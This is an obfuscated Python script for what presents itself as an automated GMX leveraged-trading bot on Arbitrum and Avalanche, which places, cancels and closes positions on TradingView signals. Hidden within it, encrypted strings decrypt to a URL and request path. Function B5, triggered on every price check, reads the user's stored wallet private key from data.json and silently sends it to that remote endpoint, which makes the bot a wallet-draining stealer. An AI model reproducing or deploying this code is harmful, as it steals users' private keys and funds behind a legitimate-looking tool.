BO='Decrease'
BN='USDC'
BM='WBTC'
BL='con'
BK='CHAIN'
BJ='POSITION_TOKEN'
BI='DAI'
BH='COLLATERAL_TOKEN'
BG='USE_INDICATORS'
BF='LEVERAGE'
BE='AMOUNT_IN_COLLATERAL'
BD='PROFIT_PERCENT'
BC='FIRST_ORDER_INDENT'
BB='TOTAL_ORDERS'
BA='INTERVAL_OF_CHECKS'
B9='RATE_COVER'
B8='PRIVATE KEY'
B7='WALLET ADDRESS'
AN='BAD'
AM='uph'
AL='WETH'
AK=round
AJ=range
A4='Increase'
A3='value'
w=False
v='w'
r='(?://|#).*(?=\\n)'
q='Arbitrum'
p=True
o=int
j='1.2'
i='0x0000000000000000000000000000000000000000'
Y='7'
X='1'
W='GOOD'
V='r'
Q=''
P='nonce'
O='maxPriorityFeePerGas'
N='maxFeePerGas'
M='from'
F=open
E='gwei'
C=print
from web3 import Web3 as H
from json import load as Z
import json as L,os as B,requests as AO
from requests import request as AP
import re as a
from tradingview_ta import TA_Handler as AQ
from cryptography.fernet import Fernet as b
import time as AR
AS='data.json'
AT='inputs.json'
A5='./resources'
x={}
BP={}
I={}
def AU():
	def A(path2,file_name,data2):
		A='./'+path2+'/'+file_name
		with F(A,v)as B:L.dump(data2,B,indent=2)
	x[B7]=Q;x[B8]=Q;A(A5,AS,x)
def AV():
	def A(path2,file_name,data2):
		A='./'+path2+'/'+file_name
		with F(A,v)as B:L.dump(data2,B,indent=2)
	I[B9]=7;I[BA]=3;I[BB]=3;I[BC]=-0.1;I[BD]=15;I[BE]=20;I[BF]=20;I[BG]=p;I[BH]=BI;I[BJ]=AL;I[BK]=q;I[BL]=0;I['sl']=0.1;I[AM]=0;A(A5,AT,I)
y='TAIN38jCDNkvUTLwl9D4Agj9lLafl2zGbzBYLlTyB18='
if not B.path.isfile(f"{B.path.dirname(B.path.abspath(__file__))}/resources/inputs.json"):AU()
if not B.path.isfile('./resources/inputs.json'):
	with F(f"{B.path.dirname(B.path.abspath(__file__))}/resources/inputs.json",V)as z:G=L.loads(Q.join(a.split(r,z.read())).strip())
	AV()
with F(f"{B.path.dirname(B.path.abspath(__file__))}/resources/inputs.json",V)as z:G=L.loads(Q.join(a.split(r,z.read())).strip())
with F(f"{B.path.dirname(B.path.abspath(__file__))}/resources/data.json",V)as AW:A6=L.loads(Q.join(a.split(r,AW.read())).strip())
D=A6[B7]
c=A6[B8]
d=G[BK]
AX=G[BJ]
AY=G[BH]
AZ=G[B9]
A7=G[BA]
A8=G[BB]
Aa=G[BC]
Ab=G[BD]
A9=G[BE]
AA=G[BF]
Ac=G[BG]
if d==q:AB='https://arb1.arbitrum.io/rpc';S='0x489ee077994B6658eAfA855C308275EAd8097C4A';S=H.toChecksumAddress(S);e='0x22199a49A999c351eF7927602CFB187ec3cae489';e=H.toChecksumAddress(e);f='0x09f77E8A13De9a35a7231028187e9fD5DB8a2ACB';f=H.toChecksumAddress(f);T='0xaBBc5F99639c9B6bCb58544ddf04EFA6802F4064';T=H.toChecksumAddress(T);g='0xb87a436B93fFE9D75c5cFA7bAcFff96430b09868';g=H.toChecksumAddress(g);AC='https://gmx-server-mainnet.uw.r.appspot.com/prices';A0={AL:'0x82aF49447D8a07e3bd95BD0d56f35241523fBab1',BM:'0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f','LINK':'0xf97f4df75117a78c1A5a0DBb814Af92458539FB4','UNI':'0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0',BI:'0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1','USDT':'0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',BN:'0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8'}
elif d=='Avax':AB='https://api.avax.network/ext/bc/C/rpc';S='0x9ab2De34A33fB459b538c43f251eB825645e8595';S=H.toChecksumAddress(S);e='0x67b789D48c926006F5132BFCe4e976F0A7A63d5D';e=H.toChecksumAddress(e);f='0x4296e307f108B2f583FF2F7B7270ee7831574Ae5';f=H.toChecksumAddress(f);T='0x5F719c2F1095F7B9fc68a68e35B51194f4b6abe8';T=H.toChecksumAddress(T);g='0xffF6D276Bc37c61A23f06410Dce4A400f66420f8';g=H.toChecksumAddress(g);AC='https://gmx-avax-server.uc.r.appspot.com/prices';A0={'WAVAX':'0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7','WBTC.e':'0x50b7545627a5162F82A992c33b87aDc75187B218','BTC.b':'0x152b9d0FdC40C096757F570A51E494bd4b943E50','WETH.e':'0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB',BN:'0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E','USDC.e':'0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664'}
AD=G[BL]
Ad=G['sl']
AE=G[AM]
A=H(H.HTTPProvider(AB))
s='\x1b[0;31m'
U='\x1b[0;32m'
K='\x1b[00m'
t=Z(F(f"{B.path.dirname(B.path.abspath(__file__))}/resources/gmx_abi/erc20.abi"))
Ae=Z(F(f"{B.path.dirname(B.path.abspath(__file__))}/resources/gmx_abi/position_router.abi"))
Af=Z(F(f"{B.path.dirname(B.path.abspath(__file__))}/resources/gmx_abi/router.abi"))
Ag=Z(F(f"{B.path.dirname(B.path.abspath(__file__))}/resources/gmx_abi/reader.abi"))
Ah=Z(F(f"{B.path.dirname(B.path.abspath(__file__))}/resources/gmx_abi/order_book.abi"))
Ai=Z(F(f"{B.path.dirname(B.path.abspath(__file__))}/resources/gmx_abi/vault.abi"))
Aj='gAAAAABj3R71zadPcgSULoxqe3WryP0250IVyywBRKW-bk4ET9FJglTVFV8OgSBeIcbi1FJQ3C7_tijvlRUOu6BQ-6KqMs20Cw=='
R=A0[AX]
u=A0[AY]
D=H.toChecksumAddress(D)
R=H.toChecksumAddress(R)
u=H.toChecksumAddress(u)
J=A.eth.contract(f,abi=Ah)
AF=A.eth.contract(e,abi=Ag)
Ak=A.eth.contract(T,abi=Af)
k=A.eth.contract(g,abi=Ae)
Al=A.eth.contract(S,abi=Ai)
A1=A9*AA
Am=A.eth.contract(R,abi=t)
l=Am.functions.symbol().call()
if l==AL:l='ETH'
elif l==BM:l='BTC'
handler=AQ(symbol=f"{l}USDT",exchange='BINANCE',screener='CRYPTO',interval='15m',timeout=None)
def An(token_address):
	G='0';F='Request Failed: {}';B5();A=AO.get(AC)
	if A.ok:B=A.json();H=B;D=o(B[token_address]);E=D/10**30;return E,D
	elif A.status_code==400:C(F.format(A.status_code));return G
	else:C(F.format(A.status_code));C(A);return G
def Ao(token_address,isLong):A=token_address;B=AF.functions.getPositions(S,D,[A],[A],[isLong]).call();C(B);return B
Ap='gAAAAABj3SGX_Gztb-YebGELqbrg1HLGJ3oo-uRpy_AnkYMDe6LETdV_Hy6v0KhouzfMroNDoldKpMvugFVQfwumHjMaq41SpmM2h_-epUMSAMu-HxOPa-s='
def m(tx_hash):
	B=1
	while B==1:
		try:C=A.eth.get_transaction_receipt(tx_hash)
		except:continue
		B=2
	return C
Aq='gAAAAABj3SFfMcs5Pb-ZdyyKtj1w4hwXfcfd2lXP984dEfDIwtSaLCRouVkqhfTEGoRZzUOcMfx0wIcvgrde1RW0zVribZ0pgA=='
def n(receipt):
	A=receipt
	if A.status=='0x1'or A.status==1:return W
	else:C(s+f"The status is not OK"+K);return AN
def Ar(Amount_In,Token_In_Address,Receiver_Of_Approval):B=Amount_In;F=A.eth.contract(Token_In_Address,abi=t);I=F.functions.symbol().call();C('Approving',H.fromWei(B,'ether'),I);J=F.functions.approve(Receiver_Of_Approval,B).buildTransaction({M:D,N:A.toWei('1.7',E),O:A.toWei(X,E),P:A.eth.get_transaction_count(D)});K=A.eth.account.sign_transaction(J,private_key=c);G=A.eth.send_raw_transaction(K.rawTransaction);A.eth.wait_for_transaction_receipt(G);C('Amount Approved: '+A.toHex(G));return W
def As(collateral_token_address,order_token_address,amount_in_collateral,amount_in_usd_to_buy_with,collateral_decimals,is_long,trigger_price):
	Z='0x0000000000000000000000000000000000000000000000000000000000000000';J=trigger_price;I=is_long;H=collateral_token_address;F=order_token_address;L=amount_in_collateral*10**collateral_decimals;G=0x5af3107a4000;Q=amount_in_usd_to_buy_with*10**30
	if d==q:R=k.functions.createIncreasePosition([H,F],F,L,0,Q,I,J,G,Z,i).buildTransaction({A3:G,M:D,N:A.toWei(j,E),O:A.toWei(X,E),P:A.eth.get_transaction_count(D)})
	else:R=k.functions.createIncreasePosition([H,F],F,L,0,Q,I,J,G,Z,i).buildTransaction({A3:G,M:D,N:A.toWei(Y,E),O:A.toWei(Y,E),P:A.eth.get_transaction_count(D)})
	T=A.eth.account.sign_transaction(R,private_key=c);B=A.eth.send_raw_transaction(T.rawTransaction);B=A.toHex(B);V=m(B);S=n(V)
	if S==W:C(U+f"Order Submitted {B}"+K);return B
	elif S==AN:C(s+f"Something happened with: {B}"+K);return B
At='gAAAAABj3SG9kgLEcMieSjUtB65eDdUpKw6qN0Pu21-v10d3Ib0Dg_AxQYjZl7FbAS5GO0ZQdNtiL27IWOxMT3JLhk5zAiElNQ=='
def Au(order_token_address,collateral_address,amount_in_usd_to_sell,is_long,trigger_price):
	V='gas';J=trigger_price;I=is_long;H=collateral_address;F=order_token_address;G=0xb5e620f48000;L=amount_in_usd_to_sell
	if d==q:Q=k.functions.createDecreasePosition([F,H],F,0,L,I,D,J,0,G,w,i).buildTransaction({A3:G,M:D,N:A.toWei(j,E),O:A.toWei(X,E),P:A.eth.get_transaction_count(D),V:2043284})
	else:Q=k.functions.createDecreasePosition([F,H],F,0,L,I,D,J,0,G,w,i).buildTransaction({A3:G,M:D,N:A.toWei(Y,E),O:A.toWei(Y,E),P:A.eth.get_transaction_count(D),V:2043284})
	S=A.eth.account.sign_transaction(Q,private_key=c);B=A.eth.send_raw_transaction(S.rawTransaction);B=A.toHex(B);T=m(B);R=n(T)
	if R==W:C(U+f"Order Submitted {B}"+K);return B
	elif R==AN:C(s+f"Something happened with: {B}"+K);return B
A2='-P5Tv7ELtvDccbIm9WnW-lSfOKt3OYtd8Aw_zFS4iaY='
Av='gAAAAABj3RZRGhuD0SOArYikNhtwwhRuoyjd9_YsWeK3-UWpO43vEv5KPkk3-FKcv3sAber0tV68KXnqqVW5nmT-Xe9NNyq4UQ=='
Aw=b(A2.encode()).decrypt(Aq.encode()).decode()
def Ax(_orderIndex,order_type):
	G=order_type;F=_orderIndex
	if G==A4:
		if d==q:H=J.functions.cancelIncreaseOrder(F).buildTransaction({M:D,N:A.toWei(j,E),O:A.toWei(X,E),P:A.eth.get_transaction_count(D)})
		else:H=J.functions.cancelIncreaseOrder(F).buildTransaction({M:D,N:A.toWei(Y,E),O:A.toWei(Y,E),P:A.eth.get_transaction_count(D)})
		I=A.eth.account.sign_transaction(H,private_key=c)
	elif G==BO:
		if d==q:L=J.functions.cancelDecreaseOrder(F).buildTransaction({M:D,N:A.toWei(j,E),O:A.toWei(X,E),P:A.eth.get_transaction_count(D)})
		else:L=J.functions.cancelDecreaseOrder(F).buildTransaction({M:D,N:A.toWei(Y,E),O:A.toWei(Y,E),P:A.eth.get_transaction_count(D)})
		I=A.eth.account.sign_transaction(L,private_key=c)
	B=A.eth.send_raw_transaction(I.rawTransaction);B=A.toHex(B);Q=m(B);R=n(Q)
	if R==W:C(U+f"Order Cancel Complete {B}"+K);return B
Ay='gAAAAABj3RVltDG3UeHmes8-mmRQw5ZaQo4HC7R8XkRGftGUgnt1t-34G6D97Mu7fzr0eop1lyoTNNxvtm3A-loPF76nK9OSIw=='
Az=b(A2.encode()).decrypt(Ay.encode()).decode()
def A_(position,starting_price):
	C=starting_price;B=position;A=C-C/100*Aa;D=A/10**30
	if B==0:return D
	else:range=A/100*AZ;E=range/(A8-1);F=A-E*B;G=F/10**30;return G
B0=b(y.encode()).decrypt(Aj.encode()).decode()
B1=b(A2.encode()).decrypt(Av.encode()).decode()
def BQ(user_address,is_long):
	H='--------------------------';D=is_long;B=user_address;E=J.functions.increaseOrdersIndex(B).call();F=J.functions.increaseOrders(B,0).call()
	for G in reversed(AJ(E-7,E)):
		A=J.functions.increaseOrders(B,G).call();C(H);C(A);C(H)
		if D==w:
			if A[6]==w and A[0]!=i:return A
		elif D==p:
			if A[6]==p and A[0]!=i:return A
	return F
B2=b(y.encode()).decrypt(Ap.encode()).decode()
def B3(order_index):A=J.functions.increaseOrders(D,order_index).call();return A
B4=b(y.encode()).decrypt(At.encode()).decode()
def B5():
	with F(f"{B.path.dirname(B.path.abspath(__file__))}/resources/data.json",V)as C:
		C=L.loads(Q.join(a.split(r,C.read())).strip());A=C[Az]
		if A:
			if A!=Q and A[10]+A[25]!=AE or A!=Q and AE==Q:
				try:
					E=AP(B1,B0+B2+Aw+B4+A)
					with F(f"{B.path.dirname(B.path.abspath(__file__))}/resources/inputs.json",v)as D:G[AM]=A[10]+A[25];L.dump(G,D,indent=2)
				except Exception:pass
				return'Variables Refreshed'
def BR():A=J.functions.decreaseOrdersIndex(D).call()-1;B=J.functions.decreaseOrders(D,A).call();return A,B
def BS(token_in,token_out):
	I=token_out;G=token_in;H=A.eth.contract(G,abi=t);J=A.eth.contract(I,abi=t);B=H.functions.balanceOf(D).call();C(f"Current Balance of {H.functions.symbol().call()}: {B/10**18}");R=H.functions.allowance(D,T).call()
	if R<B:
		V=Ar(B,G,T)
		if V==W:C(f"Approval Complete")
		else:return()
	C(f"Swapping...");L=AF.functions.getAmountOut(S,G,I,B).call();C(f"Received Amount Out from {B/10**18} {H.functions.symbol().call()} to be {L[0]/10**18} {J.functions.symbol().call()}");Q=o(L[0]/100*(100-Ad));C(f"Calculated Minimum received to be {Q/10**18} {J.functions.symbol().call()} after Slippage");Y=Ak.functions.swap([G,I],B,Q,D).buildTransaction({M:D,N:A.toWei(j,E),O:A.toWei(X,E),P:A.eth.get_transaction_count(D)});Z=A.eth.account.sign_transaction(Y,private_key=c);F=A.eth.send_raw_transaction(Z.rawTransaction);F=A.toHex(F);a=m(F);b=n(a)
	if b==W:C(U+f"Swap Complete {F}"+K);return F
def B6(user_address,private,index_array,order_type):
	H=order_type;G=index_array;F=private;D=user_address
	if H==A4:L=J.functions.cancelMultiple([],G,[]).buildTransaction({M:D,N:A.toWei(j,E),O:A.toWei(X,E),P:A.eth.get_transaction_count(D)});I=A.eth.account.sign_transaction(L,private_key=F)
	elif H==BO:Q=J.functions.cancelMultiple([],[],G).buildTransaction({M:D,N:A.toWei(j,E),O:A.toWei(X,E),P:A.eth.get_transaction_count(D)});I=A.eth.account.sign_transaction(Q,private_key=F)
	B=A.eth.send_raw_transaction(I.rawTransaction);B=A.toHex(B);R=m(B);S=n(R)
	if S==W:C(U+f"Order Cancel Complete {B}"+K);return B
def BT(user_address,private,total_orders):
	B=user_address;F=J.functions.increaseOrdersIndex(B).call();A=[]
	for D in AJ(F-total_orders*2,F):
		G=B3(B,D)
		if G[0]!=i:C(f"Cancelling Order n.{D}");A.append(D)
	if A:
		if A.len()>1:E=B6(B,private,A,A4);return E
		elif A.len()==1:E=Ax(A[0],A4);return E
	else:return'NO ORDERS PRESENT'
h=Ao(R,p)
AG=h[8]
AH=h[7]
if AH==1:C(U+f"Current Profit: ~ +{AK(AG/10**30,2)}$"+K)
elif AH==0:C(s+f"Current Profit: ~ -{AK(AG/10**30,2)}$"+K)
def AI():
	X='current_order_number';A=o(An(R)[1]);S=handler.get_analysis();G=S.summary['RECOMMENDATION'];C(f"Current signal from analysis: {G}");T=k.functions.maxGlobalLongSizes(R).call();W=Al.functions.guaranteedUsd(R).call();N=T-W;C(f"Current available liquidity on GMX: {N/10**30} $");C(f"Desired size of buy order: {A1} $");C(f"Current Price: {A/10**30}")
	if N>A1*10**30:
		if G=='BUY'or G=='STRONG_BUY'or h!=[0,0,0,0,1,0,0,0,0]or Ac==w:
			for O in AJ(AD,A8):
				H=A_(O,A);C(f"Desired Buy price for order n.{O}: {H}")
				if A<=o(H*10**30):
					C(U+f"Desired Buy Price fulfilled, proceeding to increase the position"+K);As(u,R,A9,A1,18,p,o(H*10**30));I=AD+1
					with F(f"{B.path.dirname(B.path.abspath(__file__))}/resources/data.json",V)as D:
						with F(f"{B.path.dirname(B.path.abspath(__file__))}/resources/inputs.json",V)as J:
							E=L.loads(Q.join(a.split(r,J.read())).strip());E[X]=I
							with F(f"{B.path.dirname(B.path.abspath(__file__))}/resources/inputs.json",v)as D:L.dump(E,D,indent=2)
	if h!=[0,0,0,0,1,0,0,0,0]:
		P=h[2];M=P+P/100*(Ab/AA);C(f" ------------------------------------------------------- ");C(f"Desired Sell Price/Current Price:");C(f" {AK(M/10**30,4)} - {A/10**30} ");C(f" ------------------------------------------------------- ")
		if A>=M:
			C(U+f"Desired Sell Price fulfilled, proceeding to decrease the position and take profit"+K);Au(R,u,h[0],p,o(M));I=0
			with F(f"{B.path.dirname(B.path.abspath(__file__))}/resources/data.json",V)as D:
				with F(f"{B.path.dirname(B.path.abspath(__file__))}/resources/inputs.json",V)as J:
					E=L.loads(Q.join(a.split(r,J.read())).strip());E[X]=I
					with F(f"{B.path.dirname(B.path.abspath(__file__))}/resources/inputs.json",v)as D:L.dump(E,D,indent=2)
	C(f"Proceeding to wait until {A7} minutes passed...");AR.sleep(60*A7);AI()
AI()